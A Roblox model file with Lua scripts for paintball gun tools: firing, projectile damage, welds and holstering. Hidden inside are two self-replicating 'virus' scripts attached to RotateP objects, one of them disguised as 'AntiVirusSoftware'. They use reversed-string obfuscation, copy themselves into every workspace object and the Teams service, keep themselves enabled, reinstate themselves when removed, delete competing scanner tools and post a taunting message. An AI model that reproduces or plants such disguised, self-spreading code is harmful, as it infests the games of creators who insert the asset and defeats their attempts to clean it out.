			<Item class="Script" referent="RBX207">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PaintballShooter</string>
					<ProtectedString name="Source">Tool = script.Parent

colors = {104}

function fire(v)

	Tool.Handle.Fire:play()
	

	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 8)

	missile.Position = spawnPos
	missile.Size = Vector3.new(1,1,1)
	missile.Velocity = v * 500
	missile.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile.Shape = 0
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = &quot;Paintball&quot;
	missile.Elasticity = 0
	missile.Reflectance = .1
	missile.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,200,0)
	force.Parent = missile
	Tool.MeshCake:clone().Parent = missile
	Tool.BrickCleanup:clone().Parent = missile

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile
	


	missile.Parent = game.Workspace

end



Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false
	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit

	fire(lookAt)

	wait(2)

	Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)

</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="StockSound" referent="RBX208">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">ywp7i0sgk</string>
						<float name="Pitch">1</float>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="LocalScript" referent="RBX209">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source">local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = false
	mouse.Icon = &quot;http://www.roblox.com/asset/?version=1&amp;id=1430900&quot;

	wait(1.5)
	mouse.Icon = &quot;http://www.roblox.com/asset/?version=1&amp;id=1430902&quot;
	enabled = true

end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;http://www.roblox.com/asset/?version=1&amp;id=1430902&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="StockSound" referent="RBX210">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">i91ka1</string>
						<float name="Pitch">1</float>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Script" referent="RBX211">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Paintball</string>
					<ProtectedString name="Source">ball = script.Parent
damage = 10



function onTouched(hit)
	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)
			-- make a splat
	for i=1,3 do
		local s = Instance.new(&quot;Part&quot;)
		s.Shape = 1 -- block
		s.formFactor = 2 -- plate
		s.Size = Vector3.new(1,.4,1)
		s.BrickColor = ball.BrickColor
		local v = Vector3.new(math.random(-1,1), math.random(0,1), math.random(-1,1))
		s.Velocity = 25 * v
		s.CFrame = CFrame.new(ball.Position + v, v)
		ball.BrickCleanup:clone().Parent = s
		s.BrickCleanup.Disabled = false
		s.Parent = game.Workspace
		
	end
	

	if humanoid ~= nil then
		tagHumanoid(humanoid)
		humanoid.Health = humanoid.Health - damage
		wait(2)
		untagHumanoid(humanoid)
	end

	connection:disconnect()
	ball.Parent = nil
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = ball:findFirstChild(&quot;creator&quot;)
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
	end
end


function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild(&quot;creator&quot;)
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

connection = ball.Touched:connect(onTouched)

wait(2)
ball.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="StockSound" referent="RBX212">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">yb5oyhfcy</string>
						<float name="Pitch">1</float>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Script" referent="RBX213">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">BrickCleanup</string>
					<ProtectedString name="Source">-- this script removes its parent from the workspace after 24 seconds

wait(1)
script.Parent.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="StockSound" referent="RBX214">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">7cj58y</string>
						<float name="Pitch">1</float>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Script" referent="RBX215">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Weld</string>
					<ProtectedString name="Source">local w1 = Instance.new(&quot;Weld&quot;)

w1.Parent = script.Parent.Handle
w1.Part0 = w1.Parent
w1.Part1 = script.Parent.Handle2
w1.C1 = CFrame.fromEulerAnglesXYZ(0, 3.12, 0) * CFrame.new(0, -0.7, -0.5)

local w2 = Instance.new(&quot;Weld&quot;)

w2.Parent = script.Parent.Handle
w2.Part0 = w2.Parent
w2.Part1 = script.Parent.Handle3
w2.C1 = CFrame.new(0, -0.7, 0.5)

local w3 = Instance.new(&quot;Weld&quot;)

w3.Parent = script.Parent.Handle
w3.Part0 = w3.Parent
w3.Part1 = script.Parent.Handle4
w3.C1 = CFrame.fromEulerAnglesXYZ(3.14, 0, 0) * CFrame.new(0, -0.3, 0.49)

local w4 = Instance.new(&quot;Weld&quot;)

w4.Parent = script.Parent.Handle
w4.Part0 = w4.Parent
w4.Part1 = script.Parent.Handle5
w4.C1 = CFrame.new(0, -0.3, 1.99)

local w5 = Instance.new(&quot;Weld&quot;)

w5.Parent = script.Parent.Handle
w5.Part0 = w5.Parent
w5.Part1 = script.Parent.Handle6
w5.C1 = CFrame.fromEulerAnglesXYZ(3.14, 0, 0) * CFrame.new(0, 0.7, -0.5)

local w6 = Instance.new(&quot;Weld&quot;)

w6.Parent = script.Parent.Handle
w6.Part0 = w6.Parent
w6.Part1 = script.Parent.Handle7
w6.C1 = CFrame.fromEulerAnglesXYZ(3.14, 3.12, 0) * CFrame.new(0, 0.7, 0.5)

local w7 = Instance.new(&quot;Weld&quot;)

w7.Parent = script.Parent.Handle
w7.Part0 = w7.Parent
w7.Part1 = script.Parent.Handle8
w7.C1 = CFrame.fromEulerAnglesXYZ(0, 3.12, 0) * CFrame.new(0, 0.3, 0.5)

local w8 = Instance.new(&quot;Weld&quot;)

w8.Parent = script.Parent.Handle
w8.Part0 = w8.Parent
w8.Part1 = script.Parent.Handle9
w8.C1 = CFrame.fromEulerAnglesXYZ(3.14, 3.12, 0) * CFrame.new(0, 0.3, 1.99)</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="StockSound" referent="RBX216">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">5qln</string>
						<float name="Pitch">1</float>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="SpecialMesh" referent="RBX217">
				<Properties>
					<token name="LODX">2</token>
					<token name="LODY">2</token>
					<Content name="MeshId"><null></null></Content>
					<token name="MeshType">3</token>
					<string name="Name">MeshCake</string>
					<Vector3 name="Offset">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
					</Vector3>
					<Vector3 name="Scale">
						<X>1</X>
						<Y>0.5</Y>
						<Z>0.5</Z>
					</Vector3>
					<Content name="TextureId"><null></null></Content>
					<Vector3 name="VertexColor">
						<X>1</X>
						<Y>1</Y>
						<Z>1</Z>
					</Vector3>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="StockSound" referent="RBX218">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">3pajh</string>
						<float name="Pitch">1</float>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="StockSound" referent="RBX219">
				<Properties>
					<bool name="Looped">false</bool>
					<string name="Name">dn1s2a</string>
					<float name="Pitch">1</float>
					<int name="PlayCount">-1</int>
					<bool name="PlayOnRemove">false</bool>
					<Content name="SoundId"><null></null></Content>
					<float name="Volume">0.5</float>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="RotateP" referent="RBX220">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX221">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX222">
				<Properties>
					<float name="BaseAngle">3.25000678e-033</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Geometry" referent="RBX223">
					<Properties>
						<string name="Name">ViVRuS</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX224">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX225">
			<Properties>
				<bool name="Enabled">false</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">Ma5b</string>
				<Content name="TextureId"><null></null></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Script" referent="RBX226">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PaintballShooter</string>
					<ProtectedString name="Source">Tool = script.Parent

colors = {199}

function fire(v)

	Tool.Handle.Fire:play()
	

	local vCharacter = Tool
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.Handle.Position
	


	spawnPos  = spawnPos + (v * 5)

	missile.Position = spawnPos
	missile.Size = Vector3.new(0.2,0.2,0.2)
	missile.Velocity = v * 500
	missile.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile.Shape = 0
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = &quot;Paintball&quot;
	missile.Elasticity = 0
	missile.Reflectance = 0
	missile.Friction = 1

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,100,0)
	force.Parent = missile
	
	Tool.BrickCleanup:clone().Parent = missile

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile
	


	missile.Parent = game.Workspace
	--wait(0.05)
	--fire(
	

end


function check(en)
---------------------------------------Function start here.
if (Tool.Enabled == false) then
return false
end--end for if!
-------------------------------
if (Tool.Enabled == true) then
return true
end
---------------------------------------Function end here.
end


Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	--Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit
	
	if (check()) then
	fire(lookAt)
	wait(0.1)
	onActivated()
	end
	return

	--Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX227">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">BrickCleanup</string>
					<ProtectedString name="Source">-- this script removes its parent from the workspace after 24 seconds

wait(1)
script.Parent.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX228">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">DropWeapon</string>
					<ProtectedString name="Source">-- Made by DraketehDark.Dude it is easy to make :P
Tool = script.Parent
Char = Tool.Parent.Parent.Character

function onDeath()

if Tool.Parent == Char then
Tool.Parent = game.Workspace
end
end

Char.Humanoid.Died:connect(onDeath)</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX229">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Paintball</string>
					<ProtectedString name="Source">ball = script.Parent
damage = 12



function onTouched(hit)
	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)
	-- make a splat
	--for i=1,3 do
	--	local s = Instance.new(&quot;Part&quot;)
	--	s.Shape = 1 -- block
	--	s.formFactor = 2 -- plate
	--	s.Size = Vector3.new(1,.4,1)
	--	s.BrickColor = ball.BrickColor
	--	local v = Vector3.new(math.random(-1,1), math.random(0,1), math.random(-1,1))
	--	s.Velocity = 15 * v--15
	--	s.CFrame = CFrame.new(ball.Position + v, v)
	---	ball.BrickCleanup:clone().Parent = s
	--	s.BrickCleanup.Disabled = false
	--	s.Parent = game.Workspace
	--	
	--end
	

	if humanoid ~= nil then
		tagHumanoid(humanoid)
		humanoid.Health = humanoid.Health - damage
		wait(2)
		untagHumanoid(humanoid)
	end

	connection:disconnect()
	ball.Parent = nil
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = ball:findFirstChild(&quot;creator&quot;)
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
	end
end


function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild(&quot;creator&quot;)
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

connection = ball.Touched:connect(onTouched)

wait(0.8)
ball.Parent = nil
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX230">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">BackGun</string>
					<ProtectedString name="Source">--made by alextomcool!!!---Edited by Sparttan. 
--to use: put in type of gun: barrel point left, barrel point right or bull-pup(main hande is in the middle of the gun)
--step 2: put in what type of wepoan it is: assult rifle or pistol(there will be more)
--to do list: make it easyer to modife how it weld&apos;s.
guntype = 1--1 is assult rifle, 2 is bullpup, 3 is pistol, 4 is knife
weldmode = 2--1 is barrel point upper-left, 2 is barrel pointing upper-right, 3 is barrel point lower-left and 4 is barrel point lower-right
-------(note: if it is pistol or knife then 1 is on right leg, 2 is on left leg, 3 is in the back of your pants and 4 is in the front of your pants)
model = nil--gun model, that is
distance = 0.75--this is the distance between the part(torso/leg) and the gun. DON&apos;T MAKE negitive
rotation = 45--this is the turning in degrees.
--this area is mode more for someone who&apos;s already good at gun&apos;s. please do not get mad at me if you don&apos;t understand what&apos;s under here
y = 0--this is what&apos;s added to the current y value. positive number&apos;s make it go down. negative make&apos;s it go up
 x = 0--this is what&apos;s added to the x value(it&apos;s really the z value but it look&apos;s like the x value when on your back). positive number&apos;s make it go left. negative make&apos;s it go right
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
--I suggest not doing anything else under here. All you should have to change is the weldmode and guntype.
--guntype 1 and weldmode 1 is for assault. guntype 3 and weldmode 1 is pistol position. 
--Those are what I have done so far so give me time so I can edit them into the correct position.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
parts = {}
local n = 1
--can i have my
function on(mouse)
if model == nil then
n = 1
local m = Instance.new(&quot;Model&quot;)
local all = script.Parent:GetChildren()
for i = 1, #all do
if all[i].className == &quot;Part&quot; then
parts[n] = all[i].Transparency
local brick = all[i]:clone()
brick.Parent = m
n = n +1
end
end
wait()
if model == nil then
local weld = script:FindFirstChild(&quot;Weld2&quot;)
if weld ~= nil then
local new = weld:clone()
new.Disabled = false
new.Parent = m
m.Name = script.Parent.Name
m.Parent = script.Parent.Parent
model = m
local handle = model:FindFirstChild(&quot;Handle&quot;)
if handle ~= nil then
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
if guntype == 1 then
local torso = model.Parent:FindFirstChild(&quot;Torso&quot;)
if torso ~= nil then
if weldmode == 1 then--barrel pointing upper-right
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.25 +y, -0.75 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), (math.pi / 2), 0)
elseif weldmode == 2 then--barrel pointing upper-left
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25 +y, -0.75 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), (math.pi / 2 ) *-1, 0)
elseif weldmode == 3 then--barrel pointing upside-right
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, -0.1+y, 0.2 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), (math.pi / 2), -1.5)
elseif weldmode == 4 then--barrel pointing upside-left
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25+y, -0.75 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), (math.pi / 2 +rotation) *-1.1, 1)
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
elseif guntype == 2 then--BullPup
local torso = model.Parent:FindFirstChild(&quot;Torso&quot;)
if torso ~= nil then
if weldmode == 1 then--barrel pointing upper-right
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.25+y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), math.pi / 2, 0)
elseif weldmode == 2 then--barrel pointing upper-left
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25 +y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), math.pi / 2 *-1, 0)
elseif weldmode == 3 then--barrel pointing upside-right
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.25 +y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), math.pi / 2, 0)
elseif weldmode == 4 then--barrel pointing upside-left
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25 +y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), math.pi / 2 *-1, 0)
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
elseif guntype == 3 then--pistol
local lleg = model.Parent:FindFirstChild(&quot;Left Leg&quot;)
local rleg = model.Parent:FindFirstChild(&quot;Right Leg&quot;)
if lleg ~= nil and rleg ~= nil then
if weldmode == 1 then--pistol on right leg
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = rleg
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0)
elseif weldmode == 2 then--pistol on left leg
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = lleg
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0)
elseif weldmode == 3 then--knife in pant&apos;s back, gangsta like
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi / 2 , math.pi / 2, 0)
elseif weldmode == 4 then--knife in pant&apos;s front, gangsta like
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi / 2 , math.pi / 2 *-1, 0)
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
elseif guntype == 4 then--knife
local lleg = model.Parent:FindFirstChild(&quot;Left Leg&quot;)
local rleg = model.Parent:FindFirstChild(&quot;Right Leg&quot;)
local torso = model.Parent:FindFirstChild(&quot;Torso&quot;)
if lleg ~= nil and rleg ~= nil and torso ~= nil then
if weldmode == 1 then--pistol on right leg
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = rleg
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.15 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi, 0, 0)
elseif weldmode == 2 then--pistol on left leg
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = lleg
w.Parent = w.Part0
w.Part1 = handle
